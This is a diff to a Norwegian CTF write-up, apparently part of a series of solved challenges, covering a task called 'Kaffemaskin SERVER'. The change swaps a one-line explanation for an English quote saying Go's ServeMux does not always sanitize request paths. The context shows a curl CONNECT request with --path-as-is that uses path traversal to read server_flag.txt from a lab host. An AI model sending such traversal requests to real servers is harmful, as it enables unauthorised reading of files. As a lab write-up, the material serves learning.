@@ -526,7 +526,9 @@ Jeg løste denne deloppgaven ved å bruke symlinks. Ved å lage en symlink fra f
 
 ### 2.19.3 Kaffemaskin SERVER
 https://ilya.app/blog/servemux-and-path-traversal/ 
-Bruken av mux i golang er ikke alltid trygt for å hindre path traversal:
+
+> TL;DR: Many developers assume that ServeMux always sanitizes URL request paths, but this isn’t always the case.
+
 ```sh
 $ curl -v -X CONNECT --path-as-is http://10.244.10.116:9000/service/../../../../../../../../server_flag.txt
 *   Trying 10.244.10.116:9000...
